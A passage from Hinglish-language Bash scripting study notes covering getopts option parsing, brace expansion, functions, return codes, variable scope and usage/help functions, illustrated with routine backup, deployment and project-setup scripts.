    [ "$VERBOSE" = true ] && echo "✓ Backup created"
    
    if [ "$ENCRYPT" = true ]; then
        [ "$VERBOSE" = true ] && echo "Encrypting..."
        gpg -c "$BACKUP_FILE"
        rm "$BACKUP_FILE"
        [ "$VERBOSE" = true ] && echo "✓ Encrypted"
    fi
    
    echo "✓ Complete: $BACKUP_FILE"
else
    echo "✗ Backup failed"
    exit 1
fi
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`:` bhoolna:** `a:` value ke liye zaroori
- ❌ **`$OPTARG` nahi use karna:** Value access karne ke liye
- ❌ **`shift` bhoolna:** Remaining args ke liye

### 10. **Best Practices / Pro Tips**
- 💡 **Usage function:** `-h` hamesha implement karo
- 💡 **Validation:** Required options check karo
- 💡 **Silent mode:** Leading `:` use karo
- 💡 **shift:** `shift $((OPTIND-1))` remaining args ke liye

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# deploy.sh - Production deployment

usage() {
    cat << EOF
Usage: $0 -e ENV -a APP [OPTIONS]

Required:
  -e ENV        Environment (dev|staging|prod)
  -a APP        Application name

Optional:
  -v VERSION    Version (default: latest)
  -r            Rollback mode
  -f            Force deployment
  -n            Dry run
  -h            Help

Examples:
  $0 -e prod -a myapp
  $0 -e staging -a myapp -v v2.1.0 -n
EOF
    exit 1
}

# Defaults
VERSION="latest"
ROLLBACK=false
FORCE=false
DRY_RUN=false

while getopts "e:a:v:rfnh" opt; do
    case $opt in
        e) ENVIRONMENT=$OPTARG ;;
        a) APP_NAME=$OPTARG ;;
        v) VERSION=$OPTARG ;;
        r) ROLLBACK=true ;;
        f) FORCE=true ;;
        n) DRY_RUN=true ;;
        h) usage ;;
        \?) usage ;;
    esac
done

# Validate
[ -z "$ENVIRONMENT" ] && { echo "Error: Environment required"; usage; }
[ -z "$APP_NAME" ] && { echo "Error: App name required"; usage; }

# Production safety
if [ "$ENVIRONMENT" = "prod" ] && [ "$FORCE" = false ]; then
    read -p "Deploy to PRODUCTION? (yes/no): " confirm
    [ "$confirm" != "yes" ] && exit 0
fi

# Deploy
echo "Deploying $APP_NAME to $ENVIRONMENT (version: $VERSION)"
[ "$DRY_RUN" = true ] && echo "[DRY RUN]" && exit 0

# Actual deployment logic
echo "✓ Deployment complete"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `getopts "abc:" opt` - Parse options
- ✅ `a:` requires value
- ✅ `$OPTARG` - Option value
- ✅ `shift $((OPTIND-1))` - Remaining args
- ✅ Usage function zaroori

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Long options (`--help`) kaise handle karu?**
A: `getopts` sirf short options. Long ke liye manual parsing ya `getopt` (external).

**Q2: Required options kaise enforce karu?**
A: Parse ke baad check karo: `[ -z "$VAR" ] && usage`

**Q3: Multiple values ek option mein?**
A: Array use karo ya comma-separated parse karo.

### 14. **Practice ke liye Task**

```bash
#!/bin/bash
# test_getopts.sh

while getopts "hvf:o:" opt; do
    case $opt in
        h) echo "Help" ;;
        v) VERBOSE=true ;;
        f) FILE=$OPTARG ;;
        o) OUTPUT=$OPTARG ;;
        \?) exit 1 ;;
    esac
done

echo "Verbose: ${VERBOSE:-false}"
echo "File: ${FILE:-none}"
echo "Output: ${OUTPUT:-none}"

# Run: ./test_getopts.sh -v -f input.txt -o output.txt
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🎯 Professional option parsing
- 📝 `a:` value chahiye, `a` flag
- 💼 `$OPTARG` value access
- ✅ Usage function mandatory
- 🔧 Industry standard tool

> **💡 Ye Zaroor Yaad Rakhein:**
> getopts professional scripts ka standard hai! Usage function banao, required options validate karo, aur `-h` help hamesha implement karo!

---

## **Topic 3: Brace Expansion (`file{1,2,3}.txt`, `echo {a,b,c}-{1,2,3}`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Brace Expansion** - Multiple strings automatically generate karna.

### 2. **Ye Kya Hai? (What is it?)**
Brace expansion ek shorthand hai jo multiple strings generate karta hai. `{a,b,c}` expand hokar `a b c` ban jaata hai. Yeh file creation, loops, aur batch operations ke liye powerful hai.

**Analogy:** Socho ki brace expansion ek copy machine hai jo ek template se multiple copies banata hai - har copy mein thoda variation.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Efficiency** - Multiple items quickly
- ✅ **Batch operations** - Files, directories
- ✅ **Ranges** - Numbers, letters
- ✅ **Combinations** - Cartesian product

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Multiple files banana ho
- Ranges generate karni hon
- Batch operations
- Directory structures

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Manual repetition
- Verbose commands
- Time waste
- Error-prone

### 6. **Syntax aur Common Options**

```bash
# List expansion
{a,b,c}           # a b c

# Range expansion
{1..10}           # 1 2 3 ... 10
{a..z}            # a b c ... z

# Step
{1..10..2}        # 1 3 5 7 9

# Combinations
{a,b}{1,2}        # a1 a2 b1 b2

# Nested
{a,b{1,2}}        # a b1 b2
```

### 7. **Example 1 (Basic)**

```bash
# Create multiple files
touch file{1,2,3}.txt
# Creates: file1.txt file2.txt file3.txt

# Create range
touch file{1..5}.txt
# Creates: file1.txt file2.txt ... file5.txt

# Combinations
echo {a,b,c}-{1,2,3}
# Output: a-1 a-2 a-3 b-1 b-2 b-3 c-1 c-2 c-3

# Directory structure
mkdir -p project/{src,test,docs}
# Creates: project/src project/test project/docs

# Backup
cp config.conf{,.backup}
# Same as: cp config.conf config.conf.backup
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Project structure creator

create_project() {
    local name=$1
    
    echo "Creating project: $name"
    
    # Main structure
    mkdir -p "$name"/{src,test,docs,config}
    
    # Source subdirectories
    mkdir -p "$name"/src/{controllers,models,views,utils}
    
    # Test subdirectories
    mkdir -p "$name"/test/{unit,integration,e2e}
    
    # Config files
    touch "$name"/config/{dev,staging,prod}.conf
    
    # Documentation
    touch "$name"/docs/{README,API,INSTALL}.md
    
    # Source files
    touch "$name"/src/controllers/{user,auth,admin}.js
    touch "$name"/src/models/{user,post,comment}.js
    
    echo "✓ Project structure created"
    tree "$name"
}

# Batch file operations
batch_rename() {
    # Rename file1.txt to file001.txt, etc.
    for i in {1..100}; do
        old="file${i}.txt"
        new="file$(printf "%03d" $i).txt"
        [ -f "$old" ] && mv "$old" "$new"
    done
}

# Generate test data
generate_test_files() {
    # Create test files with different extensions
    for ext in {txt,log,csv,json}; do
        for i in {1..5}; do
            echo "Test data" > "test_${i}.${ext}"
        done
    done
}

# Backup multiple configs
backup_configs() {
    local date=$(date +%Y%m%d)
    
    for config in {database,server,app}.conf; do
        if [ -f "$config" ]; then
            cp "$config" "${config}.${date}.backup"
            echo "✓ Backed up: $config"
        fi
    done
}

create_project "myapp"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Spaces dena:** `{a, b, c}` galat, `{a,b,c}` sahi
- ❌ **Variables use karna:** `{$a..$b}` kaam nahi karega
- ❌ **Quotes:** `"{1..5}"` expand nahi hoga

### 10. **Best Practices / Pro Tips**
- 💡 **No spaces:** Commas ke paas spaces nahi
- 💡 **Ranges:** `{1..100}` efficient hai
- 💡 **Combinations:** Multiple braces powerful
- 💡 **Backup trick:** `file{,.bak}` quick backup

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Multi-environment deployment

deploy_configs() {
    local app=$1
    
    # Create environment configs
    for env in {dev,staging,prod}; do
        cat > "${app}_${env}.conf" << EOF
[${env}]
app_name=${app}
environment=${env}
debug=$( [ "$env" = "prod" ] && echo "false" || echo "true" )
EOF
        echo "✓ Created: ${app}_${env}.conf"
    done
}

# Setup monitoring for multiple servers
setup_monitoring() {
    for server in web{1..5} db{1..2} cache{1..3}; do
        echo "Setting up monitoring for: $server"
        
        # Create monitoring config
        cat > "/etc/monitoring/${server}.conf" << EOF
[server]
name=${server}
check_interval=60
alerts=true
EOF
    done
}

# Batch image processing
process_images() {
    # Process images in multiple formats and sizes
    for img in photo{1..10}.jpg; do
        [ -f "$img" ] || continue
        
        for size in {thumb,medium,large}; do
            case $size in
                thumb)  convert "$img" -resize 150x150 "${img%.jpg}_${size}.jpg" ;;
                medium) convert "$img" -resize 800x600 "${img%.jpg}_${size}.jpg" ;;
                large)  convert "$img" -resize 1920x1080 "${img%.jpg}_${size}.jpg" ;;
            esac
        done
    done
}

deploy_configs "myapp"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `{a,b,c}` list expansion
- ✅ `{1..10}` range expansion
- ✅ `{1..10..2}` step expansion
- ✅ `{a,b}{1,2}` combinations
- ✅ No spaces, no quotes

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Variables use kar sakte hain?**
A: Nahi directly. `eval` use karo ya `seq` command.

**Q2: Kya nested braces kaam karte hain?**
A: Haan! `{a,b{1,2}}` → `a b1 b2`

**Q3: Leading zeros kaise add karu?**
A: `{01..10}` automatically add karega.

### 14. **Practice ke liye Task**

```bash
# 1. Create files
touch file{1..5}.txt

# 2. Create directories
mkdir -p dir{A,B,C}

# 3. Combinations
echo {red,green,blue}-{light,dark}

# 4. Range with step
echo {0..100..10}

# 5. Backup
cp important.conf{,.backup}

# 6. Project structure
mkdir -p project/{src,test}/{js,css,html}

# 7. Cleanup
rm file{1..5}.txt
rm -r dir{A,B,C} project
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔢 `{1..10}` ranges generate
- 📝 `{a,b,c}` lists expand
- 🔄 `{a,b}{1,2}` combinations
- 📁 Directory structures quickly
- ⚡ Efficient aur powerful

> **💡 Ye Zaroor Yaad Rakhein:**
> Brace expansion time-saver hai! No spaces, ranges powerful hain, combinations se multiple items quickly generate karo. `file{,.bak}` backup trick yaad rakho!

---

# **🎉 Module 9 Complete! 🎉**

Congratulations! Aapne **Module 9: Script Parameters & Expansion** successfully complete kar liya hai!

## **Aapne Kya Seekha:**
✅ **Positional Parameters** - `$1, $2, $#, $@`
✅ **getopts** - Professional option parsing
✅ **Brace Expansion** - `{1..10}`, `{a,b,c}`

## **Key Patterns:**

```bash
# Positional parameters
SOURCE=$1
DEST=$2
[ $# -lt 2 ] && echo "Usage: $0 <source> <dest>" && exit 1

# getopts
while getopts "hvf:o:" opt; do
    case $opt in
        h) usage ;;
        v) VERBOSE=true ;;
        f) FILE=$OPTARG ;;
        o) OUTPUT=$OPTARG ;;
    esac
done

# Brace expansion
touch file{1..10}.txt
mkdir -p project/{src,test,docs}
cp config{,.backup}
```

## **Real-World Applications:**
- Command-line tools
- Deployment scripts
- Batch operations
- Project scaffolding
- Configuration management

## **Best Practices:**
- Always validate arguments
- Implement usage/help function
- Use getopts for options
- Quote variables: `"$1"`
- Brace expansion for efficiency

## **Next Steps:**
Ab aap ready hain **Module 10: Functions & Arrays** ke liye!

---

=============================================================

# **Bash Shell Scripting: Zero-to-Automation Notes (Module 10)**

---

## **PART 3: BUILDING REAL SCRIPTS**

---

# **Module 10: Functions & Arrays**

---

## **Topic 1: Functions (Syntax `my_func() { ... }`, Calling)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Functions** - Reusable code blocks banana.

### 2. **Ye Kya Hai? (What is it?)**
Functions reusable code blocks hain jo ek baar define karo aur baar-baar use karo. Yeh code organization aur reusability ke liye essential hain.

**Analogy:** Socho ki function ek recipe hai - ek baar likho, jab chahiye tab use karo. Har baar same steps repeat karne ki zaroorat nahi.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Reusability** - DRY principle
- ✅ **Organization** - Clean code
- ✅ **Maintainability** - Ek jagah change
- ✅ **Testing** - Isolated testing

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Repetitive code
- Complex operations
- Code organization
- Library scripts

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Code duplication
- Maintenance nightmare
- Poor organization
- Testing mushkil

### 6. **Syntax aur Common Options**

```bash
# Method 1 (preferred)
function_name() {
    commands
}

# Method 2
function function_name {
    commands
}

# Calling
function_name
function_name arg1 arg2
```

### 7. **Example 1 (Basic)**

```bash
# Simple function
greet() {
    echo "Hello, World!"
}

greet  # Call function

# With parameters
greet_user() {
    echo "Hello, $1!"
}

greet_user "Alice"  # Output: Hello, Alice!

# Return value
add() {
    local result=$(($1 + $2))
    echo $result
}

sum=$(add 5 3)
echo "Sum: $sum"  # Output: Sum: 8
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# System utilities library

check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo "Error: Must run as root"
        return 1
    fi
    return 0
}

check_command() {
    local cmd=$1
    if ! command -v "$cmd" &>/dev/null; then
        echo "Error: $cmd not found"
        return 1
    fi
    return 0
}

backup_file() {
    local file=$1
    local backup="${file}.backup.$(date +%Y%m%d)"
    
    if [ ! -f "$file" ]; then
        echo "Error: File not found: $file"
        return 1
    fi
    
    if cp "$file" "$backup"; then
        echo "✓ Backup created: $backup"
        return 0
    else
        echo "✗ Backup failed"
        return 1
    fi
}

install_package() {
    local package=$1
    
    check_root || return 1
    
    echo "Installing: $package"
    
    if apt-get install -y "$package" &>/dev/null; then
        echo "✓ Installed: $package"
        return 0
    else
        echo "✗ Installation failed: $package"
        return 1
    fi
}

# Usage
backup_file "/etc/hosts"
install_package "curl"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Parentheses in call:** `function()` galat, `function` sahi
- ❌ **Return vs echo:** `return` exit status, `echo` output
- ❌ **Global variables:** Use `local` for function variables

### 10. **Best Practices / Pro Tips**
- 💡 **`local` use karo:** Function variables local rakho
- 💡 **Single responsibility:** Ek function ek kaam
- 💡 **Error handling:** Return codes use karo
- 💡 **Documentation:** Comments add karo

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Deployment automation

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*"
}

error() {
    log "ERROR: $*" >&2
}

validate_environment() {
    local env=$1
    case $env in
        dev|staging|prod) return 0 ;;
        *) error "Invalid environment: $env"; return 1 ;;
    esac
}

deploy_app() {
    local env=$1
    local version=$2
    
    log "Starting deployment to $env"
    
    validate_environment "$env" || return 1
    
    log "Pulling version: $version"
    git pull origin "$version" || return 1
    
    log "Installing dependencies"
    npm install || return 1
    
    log "Building application"
    npm run build || return 1
    
    log "Restarting service"
    systemctl restart myapp || return 1
    
    log "✓ Deployment complete"
    return 0
}

deploy_app "staging" "v2.1.0"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `func() { ... }` define
- ✅ `func` call karo
- ✅ `$1, $2` parameters
- ✅ `return` exit status
- ✅ `local` variables

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Return value kaise get karu?**
A: `echo` use karo output ke liye, `return` exit status ke liye.

**Q2: Global variables kaise avoid karu?**
A: `local` keyword use karo function ke andar.

**Q3: Function overloading possible hai?**
A: Nahi, same naam se sirf ek function.

### 14. **Practice ke liye Task**

```bash
# 1. Simple function
hello() {
    echo "Hello!"
}
hello

# 2. With parameters
greet() {
    echo "Hello, $1!"
}
greet "World"

# 3. Return value
multiply() {
    echo $(($1 * $2))
}
result=$(multiply 5 3)
echo $result

# 4. Local variables
test_local() {
    local x=10
    echo "Inside: $x"
}
test_local
echo "Outside: $x"  # Empty
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔧 Functions reusable code blocks
- 📥 `$1, $2` parameters access
- 🔙 `return` exit status, `echo` output
- 🔒 `local` variables function mein
- 📚 Code organization ka foundation

> **💡 Ye Zaroor Yaad Rakhein:**
> Functions professional scripting ka backbone hain! `local` use karo variables ke liye, `return` exit status ke liye, `echo` output ke liye!

---

## **Topic 2: Function Arguments (`$1`, `$2`) & `return`**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Function Arguments** - Functions ko parameters pass karna aur values return karna.

### 2. **Ye Kya Hai? (What is it?)**
Functions ko arguments pass karne ka tarika same hai jaise scripts ko - `$1`, `$2`, etc. `return` command exit status (0-255) return karta hai, actual values `echo` se return hoti hain.

**Analogy:** Function ek machine hai - arguments input hain, return status success/failure indicator hai, aur echo actual output hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Flexibility** - Dynamic functions
- ✅ **Error handling** - Return codes
- ✅ **Data flow** - Input/output
- ✅ **Testability** - Predictable behavior

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Dynamic operations
- Error handling
- Data processing
- Validation functions

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Hardcoded functions
- No error handling
- Poor data flow
- Testing impossible

### 6. **Syntax aur Common Options**

```bash
function_name() {
    local arg1=$1
    local arg2=$2
    
    # Process
    
    echo "output"  # Return value
    return 0       # Exit status (0=success)
}

# Call and capture
result=$(function_name "value1" "value2")
status=$?
```

### 7. **Example 1 (Basic)**

```bash
# Arguments
add() {
    local a=$1
    local b=$2
    echo $(($a + $b))
}

sum=$(add 10 20)
echo "Sum: $sum"  # 30

# Return status
is_valid() {
    local value=$1
    if [ "$value" -gt 0 ]; then
        return 0  # Success
    else
        return 1  # Failure
    fi
}

if is_valid 5; then
    echo "Valid"
fi

# Multiple returns
divide() {
    local a=$1
    local b=$2
    
    if [ "$b" -eq 0 ]; then
        echo "Error: Division by zero"
        return 1
    fi
    
    echo $(($a / $b))
    return 0
}

result=$(divide 10 2)
if [ $? -eq 0 ]; then
    echo "Result: $result"
fi
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Database operations

db_connect() {
    local host=$1
    local user=$2
    local pass=$3
    
    if mysql -h "$host" -u "$user" -p"$pass" -e "SELECT 1" &>/dev/null; then
        return 0
    else
        return 1
    fi
}

db_query() {
    local query=$1
    local result
    
    result=$(mysql -e "$query" 2>&1)
    
    if [ $? -eq 0 ]; then
        echo "$result"
        return 0
    else
        echo "Query failed: $result" >&2
        return 1
    fi
}

validate_email() {
    local email=$1
    local regex='^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    
    if [[ $email =~ $regex ]]; then
        return 0
    else
        return 1
    fi
}

create_user() {
    local username=$1
    local email=$2
    local password=$3
    
    # Validate email
    if ! validate_email "$email"; then
        echo "Invalid email: $email"
        return 1
    fi
    
    # Check if user exists
    if id "$username" &>/dev/null; then
        echo "User already exists: $username"
        return 2
    fi
    
    # Create user
    if useradd -m -c "$email" "$username"; then
        echo "$username:$password" | chpasswd
        echo "✓ User created: $username"
        return 0
    else
        echo "✗ Failed to create user"
        return 1
    fi
}

# Usage with error handling
if create_user "john" "john@example.com" "secret123"; then
    echo "Success"
else
    case $? in
        1) echo "Validation or creation failed" ;;
        2) echo "User already exists" ;;
    esac
fi
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Return value confuse:** `return` sirf 0-255
- ❌ **`$?` check nahi:** Exit status verify karo
- ❌ **Global `$1`:** Function ke andar `$1` function ka argument hai

### 10. **Best Practices / Pro Tips**
- 💡 **Local variables:** Arguments ko local mein store karo
- 💡 **Return 0:** Success ke liye
- 💡 **Return 1-255:** Different errors
- 💡 **Echo for data:** Actual values echo se

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# File processor with error handling

validate_file() {
    local file=$1
    
    if [ ! -e "$file" ]; then
        echo "File not found" >&2
        return 1
    fi
    
    if [ ! -r "$file" ]; then
        echo "File not readable" >&2
        return 2
    fi
    
    if [ ! -s "$file" ]; then
        echo "File is empty" >&2
        return 3
    fi
    
    return 0
}

process_file() {
    local file=$1
    local output=$2
    
    validate_file "$file"
    local status=$?
    
    case $status in
        0) ;;  # Continue
        1) return 1 ;;
        2) return 2 ;;
        3) return 3 ;;
    esac
    
    # Process
    if cat "$file" | tr '[:lower:]' '[:upper:]' > "$output"; then
        echo "✓ Processed: $file → $output"
        return 0
    else
        echo "✗ Processing failed"
        return 4
    fi
}

# Batch processing
for file in *.txt; do
    output="processed_${file}"
    
    if ! process_file "$file" "$output"; then
        case $? in
            1) echo "  Error: File not found" ;;
            2) echo "  Error: Permission denied" ;;
            3) echo "  Error: Empty file" ;;
            4) echo "  Error: Processing failed" ;;
        esac
    fi
done
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `$1, $2` function arguments
- ✅ `return 0` success
- ✅ `return 1-255` errors
- ✅ `echo` actual output
- ✅ `$?` exit status check

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `return` aur `exit` mein kya fark hai?**
A: `return` function se exit, `exit` script se exit.

**Q2: String kaise return karu?**
A: `echo` use karo, phir `result=$(function)` se capture karo.

**Q3: Multiple values kaise return karu?**
A: Array use karo ya space-separated echo karo.

### 14. **Practice ke liye Task**

```bash
# 1. Arguments
greet() {
    echo "Hello, $1 $2!"
}
greet "John" "Doe"

# 2. Return status
check_positive() {
    [ $1 -gt 0 ] && return 0 || return 1
}
check_positive 5 && echo "Positive"

# 3. Return value
square() {
    echo $(($1 * $1))
}
result=$(square 5)
echo $result

# 4. Error codes
validate() {
    [ -z "$1" ] && return 1
    [ ${#1} -lt 3 ] && return 2
    return 0
}
validate "ab"
echo "Status: $?"
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📥 `$1, $2` function parameters
- ✅ `return 0` success indicator
- ❌ `return 1-255` error codes
- 📤 `echo` actual data return
- 🔍 `$?` status check karo

> **💡 Ye Zaroor Yaad Rakhein:**
> Return codes (0-255) status ke liye, echo actual data ke liye! Hamesha `$?` check karo error handling ke liye!

---

## **Topic 3: Variable Scope (`local` vs Global)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Variable Scope** - Variables ki visibility aur lifetime control karna.

### 2. **Ye Kya Hai? (What is it?)**
Variable scope define karta hai ki variable kahan accessible hai. Global variables script mein kahin bhi, local variables sirf function ke andar accessible hain.

**Analogy:** Global variable ek public announcement hai jo sabko sunai deta hai. Local variable ek private conversation hai jo sirf room ke andar wale sun sakte hain.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Encapsulation** - Data hiding
- ✅ **No conflicts** - Name collisions avoid
- ✅ **Maintainability** - Clear boundaries
- ✅ **Testing** - Isolated functions

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Function variables
- Temporary data
- Avoiding conflicts
- Clean code

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Variable conflicts
- Unexpected behavior
- Debugging nightmare
- Poor encapsulation

### 6. **Syntax aur Common Options**

```bash
# Global variable
GLOBAL_VAR="global"

function_name() {
    # Local variable
    local LOCAL_VAR="local"
    
    # Access global
    echo $GLOBAL_VAR
    
    # Modify global
    GLOBAL_VAR="modified"
}
```

### 7. **Example 1 (Basic)**

```bash
# Global variable
name="Global"

test_scope() {
    local name="Local"
    echo "Inside function: $name"  # Local
}

test_scope
echo "Outside function: $name"  # Global

# Without local
counter=0

increment() {
    counter=$((counter + 1))  # Modifies global
}

increment
echo "Counter: $counter"  # 1

# With local
counter=0

increment_local() {
    local counter=$((counter + 1))  # Local copy
    echo "Inside: $counter"
}

increment_local  # Inside: 1
echo "Outside: $counter"  # 0 (unchanged)
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Configuration manager

# Global config
CONFIG_FILE="/etc/app/config.conf"
DEBUG=false

load_config() {
    local line
    local key
    local value
    
    while IFS='=' read -r key value; do
        [[ -z $key || $key == \#* ]] && continue
        
        # Set global variables
        case $key in
            DEBUG) DEBUG=$value ;;
            LOG_LEVEL) LOG_LEVEL=$value ;;
            MAX_CONNECTIONS) MAX_CONNECTIONS=$value ;;
        esac
    done < "$CONFIG_FILE"
}

log() {
    local level=$1
    shift
    local message="$*"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    # Use global DEBUG
    if [ "$DEBUG" = true ]; then
        echo "[$timestamp] [$level] $message"
    fi
}

process_data() {
    local input=$1
    local output=$2
    local temp_file="/tmp/process_$$"  # Local temp
    
    log "INFO" "Processing: $input"
    
    # Process
    cat "$input" > "$temp_file"
    mv "$temp_file" "$output"
    
    log "INFO" "Complete: $output"
}

# Connection pool
declare -g ACTIVE_CONNECTIONS=0  # Explicit global
MAX_CONNECTIONS=10

acquire_connection() {
    local conn_id=$1
    
    if [ $ACTIVE_CONNECTIONS -ge $MAX_CONNECTIONS ]; then
        echo "Max connections reached"
        return 1
    fi
    
    ((ACTIVE_CONNECTIONS++))
    echo "Connection $conn_id acquired (active: $ACTIVE_CONNECTIONS)"
    return 0
}

release_connection() {
    local conn_id=$1
    
    if [ $ACTIVE_CONNECTIONS -gt 0 ]; then
        ((ACTIVE_CONNECTIONS--))
        echo "Connection $conn_id released (active: $ACTIVE_CONNECTIONS)"
    fi
}

load_config
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`local` bhoolna:** Global pollution
- ❌ **Function ke bahar `local`:** Error dega
- ❌ **Unintended global modification:** Side effects

### 10. **Best Practices / Pro Tips**
- 💡 **Default local:** Function variables hamesha local
- 💡 **Explicit global:** `declare -g` use karo clarity ke liye
- 💡 **Constants uppercase:** `GLOBAL_CONSTANT`
- 💡 **Minimize globals:** Sirf zaroorat par use karo

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Multi-threaded task processor

# Global state
declare -g TOTAL_TASKS=0
declare -g COMPLETED_TASKS=0
declare -g FAILED_TASKS=0

process_task() {
    local task_id=$1
    local task_data=$2
    local start_time=$(date +%s)
    
    echo "Processing task $task_id..."
    
    # Simulate work
    sleep $((RANDOM % 3 + 1))
    
    local end_time=$(date +%s)
    local duration=$((end_time - start_time))
    
    # Update global counters
    if [ $((RANDOM % 10)) -gt 2 ]; then
        ((COMPLETED_TASKS++))
        echo "✓ Task $task_id completed in ${duration}s"
        return 0
    else
        ((FAILED_TASKS++))
        echo "✗ Task $task_id failed"
        return 1
    fi
}

show_progress() {
    local processed=$((COMPLETED_TASKS + FAILED_TASKS))
    local percent=$((processed * 100 / TOTAL_TASKS))
    
    echo "Progress: $processed/$TOTAL_TASKS ($percent%)"
    echo "  Completed: $COMPLETED_TASKS"
    echo "  Failed: $FAILED_TASKS"
}

# Main
TOTAL_TASKS=10

for i in $(seq 1 $TOTAL_TASKS); do
    process_task $i "data_$i" &
done

wait  # Wait for all background jobs

show_progress
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `local` function variables
- ✅ Global by default
- ✅ `declare -g` explicit global
- ✅ Minimize global usage
- ✅ Avoid name conflicts

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Kya arrays local ho sakte hain?**
A: Haan! `local arr=(1 2 3)`

**Q2: Nested functions mein scope kaise kaam karta hai?**
A: Inner function outer ke local variables access kar sakta hai.

**Q3: Global variable kaise explicitly declare karu?**
A: `declare -g VARIABLE=value`

### 14. **Practice ke liye Task**

```bash
# 1. Local vs Global
x=10
test() {
    local x=20
    echo "Inside: $x"
}
test
echo "Outside: $x"

# 2. Modify global
counter=0
increment() {
    ((counter++))
}
increment
echo $counter

# 3. Local doesn't affect global
value=100
change() {
    local value=200
}
change
echo $value

# 4. Explicit global
test2() {
    declare -g GLOBAL_VAR="test"
}
test2
echo $GLOBAL_VAR
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔒 `local` function ke andar
- 🌍 Global by default
- 🎯 Minimize global variables
- 📝 `declare -g` explicit global
- ✅ Avoid name conflicts

> **💡 Ye Zaroor Yaad Rakhein:**
> Function variables HAMESHA local rakho! Global pollution avoid karo, name conflicts se bacho, clean aur maintainable code likho!

---

## **Topic 4: Help/Usage Function Banana (Best Practice)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Usage Function** - Professional help/usage messages implement karna.

### 2. **Ye Kya Hai? (What is it?)**
Usage function ek standard practice hai jo script ka usage, options, aur examples dikhata hai. Yeh user-friendly scripts ka hallmark hai.

**Analogy:** Usage function ek instruction manual hai jo product ke saath aata hai - kaise use karna hai, kya options hain, examples kya hain.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **User-friendly** - Self-documenting
- ✅ **Professional** - Industry standard
- ✅ **Reduces errors** - Clear instructions
- ✅ **Maintainability** - Documentation built-in

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Har production script mein
- Command-line tools
- Shared scripts
- Complex scripts

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Users confused
- Support requests increase
- Poor adoption
- Unprofessional image

### 6. **Syntax aur Common Options**

```bash
usage() {
    cat << EOF
Usage: $0 [OPTIONS]

Description of script

Options:
  -h, --help     Show this help
  -v, --version  Show version
  -f FILE        Input file
  -o FILE        Output file

Examples:
  $0 -f input.txt -o output.txt
  $0 --help

EOF
    exit 1
}

# Call on -h or invalid args
[ "$1" = "-h" ] && usage
[ $# -eq 0 ] && usage
```

### 7. **Example 1 (Basic)**

```bash
#!/bin/bash

usage() {
    cat << EOF
Usage: $0 <source> <destination>

Backup utility

Arguments:
  source        Source directory
  destination   Backup destination

Options:
  -h            Show this help
  -v            Verbose output

Example:
  $0 /home/user /backups
EOF
    exit 1
}

[ "$1" = "-h" ] && usage
[ $# -lt 2 ] && usage

echo "Backing up $1 to $2..."
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# deploy.sh - Professional deployment script

VERSION="2.1.0"

usage() {
    cat << EOF
╔════════════════════════════════════════════════════════════╗
║                  DEPLOYMENT SCRIPT v${VERSION}                  ║
╚════════════════════════════════════════════════════════════╝

